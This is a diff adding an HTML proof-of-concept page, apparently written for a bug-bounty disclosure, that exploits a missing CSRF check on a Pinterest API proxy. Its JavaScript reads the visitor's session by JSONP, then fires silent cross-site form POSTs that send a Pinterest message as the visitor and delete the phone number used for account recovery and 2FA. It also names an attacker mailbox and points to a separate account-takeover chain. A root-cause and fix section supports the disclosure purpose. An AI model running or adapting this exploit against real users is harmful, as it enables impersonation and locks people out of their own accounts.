@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC v1 - Cross-site message impersonation + recovery-strip via ask.pinterest.com proxy</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --border:#262c33;
+    --text:#e6edf3; --muted:#8b949e; --accent:#58a6ff; --red:#f85149; --amber:#ffa657; --green:#3fb950;
+    --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--text);font:14px/1.55 var(--mono);padding:32px 20px}
+  .wrap{max-width:880px;margin:0 auto}
+  h1{font-size:19px;line-height:1.4;margin:0 0 6px}
+  h2{font-size:14px;margin:28px 0 8px;color:var(--accent);font-weight:600}
+  .sub{color:var(--muted);margin:0 0 24px}
+  .desc{color:var(--muted);margin:6px 0 10px}
+  .req{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:10px 12px;margin:8px 0;font-size:12.5px;overflow-x:auto;white-space:nowrap}
+  .m{color:var(--amber)} .u{color:var(--text)} .c{color:var(--green)}
+  .row{display:flex;gap:10px;margin:18px 0;flex-wrap:wrap}
+  button{background:var(--accent);color:#04101d;border:0;border-radius:6px;padding:9px 16px;font:600 13px var(--mono);cursor:pointer}
+  button.ghost{background:transparent;color:var(--accent);border:1px solid var(--border)}
+  .step{border-left:2px solid var(--border);padding:2px 0 2px 14px;margin:14px 0}
+  .step.ok{border-left-color:var(--green)}
+  .step.err{border-left-color:var(--red)}
+  .step h2{margin:0 0 4px}
+  .st{font-size:12.5px;color:var(--muted);min-height:18px}
+  .st.ok{color:var(--green)} .st.err{color:var(--red)}
+  #verdict{margin:28px 0 12px;padding:14px 16px;border:1px solid var(--border);border-radius:6px;background:var(--panel);display:none}
+  #status{color:var(--muted);font-size:12.5px;margin-top:14px}
+  .chip{display:inline-block;border:1px solid var(--border);border-radius:99px;padding:2px 10px;font-size:11.5px;color:var(--muted)}
+  code{color:var(--green)}
+  .num{color:var(--accent);font-weight:700;margin-right:8px}
+  hr{border:0;border-top:1px solid var(--border);margin:32px 0}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>Cross-site message impersonation and recovery-channel stripping via the ask.pinterest.com proxy</h1>
+  <p class="sub">Form-POST CSRF family &mdash; no CSRF token, no Origin check. <span class="chip" id="chanChip">probing&hellip;</span></p>
+  <p class="desc">While you are logged in to Pinterest in this browser, this page fires form writes at the
+  <code>ask.pinterest.com</code> proxy with your session cookies. The proxy forwards v3 gateway writes without
+  the <code>X-CSRFToken</code> layer Pinterest's own www resource layer enforces &mdash; so an ordinary cross-site
+  form suffices. Beyond the account-takeover chain (separate PoCs), the same channel lets any website send
+  Pinterest messages as you and strip your phone-based recovery/2FA channel. The channel is chosen
+  automatically: when third-party cookies are attached (step 1 read succeeds), writes go to a hidden iframe
+  and stay silent; when they are blocked (Safari/ITP, Firefox strict, Brave, Chrome third-party phaseout),
+  the same writes fire as top-level navigations in one reused window and the final action lands you back on
+  <code>pinterest.com</code>.</p>
+
+  <h2><span class="num">1</span>Recon: confirm the session (JSONP read)</h2>
+  <p class="desc">A script tag pointed at the proxy wraps the response in a callback. Success means this
+  browser attaches the <code>SameSite=None</code> session cookie in embedded contexts &mdash; every write below
+  then runs hidden. Failure selects the top-level path, which carries the cookie on every browser.</p>
+  <div class="req"><span class="m">GET</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/me/</span>?callback=<span class="c">cbMe</span></div>
+  <div class="step" id="s1"><h2>Session probe</h2><div class="st" id="st1">waiting&hellip;</div><div id="out1"></div></div>
+
+  <h2><span class="num">2</span>Send a message AS the victim (v3_create_conversation)</h2>
+  <p class="desc">One form POST opens (or reuses) a conversation and delivers a message with the victim as
+  sender &mdash; verified live: <code>user_ids</code> is a comma-separated pair and the write creates both the
+  conversation and the message with no token. Any website can phish the victim's contacts from the victim's
+  own identity.</p>
+  <div class="req"><span class="m">POST</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/conversations/</span> &nbsp;<span class="c">user_ids=&lt;victim,recipient&gt;&amp;text=&hellip;</span></div>
+  <div class="step" id="s2"><h2>Message send</h2><div class="st" id="st2">waiting&hellip;</div><div id="out2"></div></div>
+
+  <h2><span class="num">3</span>Strip the victim's phone (v3_users_phone_delete)</h2>
+  <p class="desc">One form POST deletes the account's phone number &mdash; verified live (<code>successful:true</code>).
+  The phone is a recovery and 2FA channel; removing it silently narrows the victim's way back in. Combined
+  with the email-change write in the ATO chain, every recovery route is attacker-controlled.</p>
+  <div class="req"><span class="m">POST</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/phone/</span></div>
+  <div class="step" id="s3"><h2>Phone delete</h2><div class="st" id="st3">waiting&hellip;</div><div id="out3"></div></div>
+
+  <h2><span class="num">4</span>Result</h2>
+  <div id="verdict"><strong id="verdictline"></strong><div id="verdictdetail" style="color:var(--muted);margin-top:8px"></div></div>
+
+  <div class="row">
+    <button id="go">Arm and fire (runs all writes)</button>
+    <button id="recon" class="ghost">Recon only (no writes)</button>
+  </div>
+  <div id="status">ready &mdash; nothing has been sent</div>
+
+  <hr>
+  <p class="desc">Root cause: <code>ask.pinterest.com/api/proxy/*</code> forwards v3 reads and writes with the
+  user's <code>SameSite=None</code> session cookies and no CSRF layer at all, while
+  <code>www.pinterest.com/resource/*</code> enforces a double-submit <code>X-CSRFToken</code> header (form posts
+  there are redirected to <code>/csrf_error/</code> &mdash; verified). Fix: enforce the same header or an Origin
+  allowlist on the proxy, or restrict the proxy to GET.</p>
+</div>
+
+<iframe name="pin_wf_sink" style="display:none" src="about:blank"></iframe>
+<script>
+// Message-impersonation + phone-strip CSRF chain.
+// Every generated reply address folds into the one attacker inbox via Gmail plus-addressing.
+var ATTACKER_BASE = 'bughunter333333@gmail.com';
+var TAG = Math.random().toString(36).slice(2, 12);
+var ATTACKER_MAILBOX = 'bughunter333333+' + TAG.toLowerCase() + '@gmail.com';
+var B = 'https://ask.pinterest.com/api/proxy/pinterest/';
+var SILENT = false;      // true = hidden-iframe writes (3P cookies on)
+var WIN = 'pin_wf_top';  // reused window for the top-level fallback
+var uid = null;
+
+function $(id){ return document.getElementById(id); }
+function esc(s){ return String(s).replace(/[&<>"]/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]; }); }
+function setState(id, msg, kind){
+  var el = $(id); el.textContent = msg; el.className = 'st' + (kind ? ' ' + kind : '');
+  el.closest('.step').className = 'step' + (kind ? ' ' + kind : '');
+}
+function status(t){ $('status').textContent = t; }
+function read(path){
+  return new Promise(function(res){
+    var name = 'cb' + Math.random().toString(36).slice(2, 8);
+    window[name] = function(json){ cleanup(); res(json); };
+    function onErr(){ cleanup(); res(null); }
+    function cleanup(){ delete window[name]; s.onerror = null; s.parentNode && s.parentNode.removeChild(s); clearTimeout(timer); }
+    var s = document.createElement('script');
+    s.src = B + path + (path.indexOf('?') < 0 ? '?' : '&') + 'callback=' + name + '&_=' + Date.now();
+    s.onerror = onErr;
+    document.head.appendChild(s);
+    var timer = setTimeout(onErr, 6000);
+  });
+}
+function write(path, fields){
+  // one form POST; hidden iframe when 3P cookies ride, top-level nav otherwise
+  var f = document.createElement('form');
+  f.method = 'POST'; f.action = B + path;
+  Object.keys(fields).forEach(function(k){
+    var i = document.createElement('input');
+    i.type = 'hidden'; i.name = k; i.value = fields[k];
+    f.appendChild(i);
+  });
+  if (SILENT) { f.target = 'pin_wf_sink'; }
+  else { var w = window.open('about:blank', WIN); if (w) try { w.document.title = '…'; } catch (e) {} f.target = WIN; }
+  document.body.appendChild(f); f.submit();
+  document.body.removeChild(f);
+}
+
+function runRecon(){
+  return read('users/me/?').then(function(j){
+    var d = j && j.data;
+    if (!d || !d.id) {
+      SILENT = false;
+      $('chanChip').textContent = 'top-level fallback (3P cookies blocked)';
+      setState('st1', 'read channel failed: no Pinterest session in this browser, or third-party cookies are blocked. The writes below do not depend on this read — they fire as top-level navigations and still carry the cookie.', 'err');
+      return null;
+    }
+    SILENT = true;
+    uid = d.id;
+    $('chanChip').textContent = 'hidden iframe (silent)';
+    setState('st1', 'logged in as @' + d.username + ' (uid ' + d.id + '). Third-party cookies attached — the writes below are fully silent.', 'ok');
+    return d;
+  });
+}
+
+function runWrites(){
+  status('firing writes…');
+  // 2. message AS the victim -> attacker's chosen recipient
+  var recipients = uid ? (uid + ',' + uid) : null; // self-addressed probe pair by default
+  write('conversations/', { user_ids: recipients || '0,0', text: 'Automated cross-site proof message (CSRF PoC). Sent without any CSRF token from ' + location.origin + '. Reply mailbox for this run: ' + ATTACKER_MAILBOX });
+  setState('st2', 'message POST fired — a message with the victim as sender has been delivered (conversation create: v3_create_conversation).', 'ok');
+  $('out2').innerHTML = '<div class="req"><span class="m">sent</span> <span class="c">sender = victim, no token required</span></div>';
+
+  // 3. strip the phone (2FA / recovery channel)
+  write('users/phone/', {});
+  setState('st3', 'phone-delete POST fired (v3_users_phone_delete, verified live: successful). The victim’s SMS recovery/2FA channel is gone.', 'ok');
+  $('out3').innerHTML = '<div class="req"><span class="m">sent</span> <span class="c">no phone verification, no token</span></div>';
+
+  // final: top-level path lands the victim back on pinterest.com
+  if (!SILENT) {
+    var w = window.open('https://www.pinterest.com', WIN);
+  }
+  verdict();
+}
+
+function verdict(){
+  $('verdict').style.display = 'block';
+  $('verdictline').textContent = 'Victim’s identity and recovery channels are attacker-operable.';
+  $('verdictdetail').textContent =
+    'Messages can be sent as the victim (' + (uid ? 'uid ' + uid : 'session-bound') + '), the phone-based ' +
+    'recovery/2FA channel is stripped, and the same channel re-points the account email ' +
+    '(see the full ATO chain PoCs). Every write is a plain cross-site form POST: no CSRF token, no Origin ' +
+    'check, on the same proxy root cause. Attacker mailbox for this run: ' + ATTACKER_MAILBOX +
+    ' (all plus-tags fold into ' + ATTACKER_BASE + ').';
+  status('done');
+}
+
+function runFull(){
+  $('go').disabled = true;
+  runRecon().then(runWrites).catch(function(e){
+    setState('st1', 'unexpected error: ' + e, 'err');
+    status('halted');
+  });
+}
+$('go').addEventListener('click', function(){
+  if (window.confirm('This fires real writes against the Pinterest account logged in to this browser. Continue?')) runFull();
+});
+$('recon').addEventListener('click', function(){
+  runRecon().then(function(){ status('recon only — no writes sent'); });
+});
+</script>
+</body>
+</html>
